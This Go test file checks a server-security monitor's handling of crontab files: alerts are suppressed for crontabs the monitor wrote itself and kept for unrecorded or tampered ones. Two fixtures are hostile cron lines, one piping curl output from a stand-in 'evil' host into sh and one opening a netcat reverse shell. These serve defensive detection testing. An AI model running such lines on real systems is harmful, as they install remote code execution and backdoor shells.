package checks

import (
	"testing"
)

// A crontab CSM itself installed must not raise "new sensitive file appeared".
func TestEvaluateSensitiveFileAppearance_SuppressesCSMSelfWrite(t *testing.T) {
	resetSelfWrites(t)
	path := "/var/spool/cron/aromedenarghile"
	content := []byte("# CSM WP-Cron /home/aromedenarghile/public_html\n*/5 * * * * cd '/home/aromedenarghile/public_html' && '/usr/local/bin/php' wp-cron.php\n")
	withMockOS(t, &mockOS{readFile: func(string) ([]byte, error) { return content, nil }})

	RecordSelfWrite(path, content)
	if _, emit := EvaluateSensitiveFileAppearance(path); emit {
		t.Error("after RecordSelfWrite, the matching crontab appearance must be suppressed")
	}
}

// A crontab that appears WITHOUT a matching CSM self-write must still alarm.
func TestEvaluateSensitiveFileAppearance_FlagsUnrecordedCron(t *testing.T) {
	resetSelfWrites(t)
	path := "/var/spool/cron/attacker"
	content := []byte("* * * * * curl http://evil/x | sh\n")
	withMockOS(t, &mockOS{readFile: func(string) ([]byte, error) { return content, nil }})

	if _, emit := EvaluateSensitiveFileAppearance(path); !emit {
		t.Error("a crontab CSM did not write must still raise a finding")
	}
}

// Tamper layered on top of a CSM-written crontab changes the hash and must
// still alarm -- suppression is content-bound, not a path allowlist.
func TestEvaluateSensitiveFileAppearance_FlagsTamperedCSMCron(t *testing.T) {
	resetSelfWrites(t)
	path := "/var/spool/cron/aromedenarghile"
	clean := []byte("# CSM WP-Cron\n*/5 * * * * php wp-cron.php\n")
	RecordSelfWrite(path, clean)

	tampered := append(append([]byte{}, clean...), []byte("* * * * * nc evil 4444 -e /bin/sh\n")...)
	withMockOS(t, &mockOS{readFile: func(string) ([]byte, error) { return tampered, nil }})

	if _, emit := EvaluateSensitiveFileAppearance(path); !emit {
		t.Error("a tampered crontab (hash changed) must still raise a finding")
	}
}

// The realtime write path must also honor the self-write ledger.
func TestEvaluateSensitiveFileWrite_SuppressesCSMSelfWrite(t *testing.T) {
	resetSelfWrites(t)
	path := "/var/spool/cron/baxiro"
	content := []byte("# CSM WP-Cron\n*/5 * * * * php wp-cron.php\n")
	RecordSelfWrite(path, content)
	withMockOS(t, &mockOS{readFile: func(string) ([]byte, error) { return content, nil }})

	if _, emit := EvaluateSensitiveFileWrite(path, 0, 1234, "crontab"); emit {
		t.Error("realtime write event for a CSM-written crontab must be suppressed")
	}
}
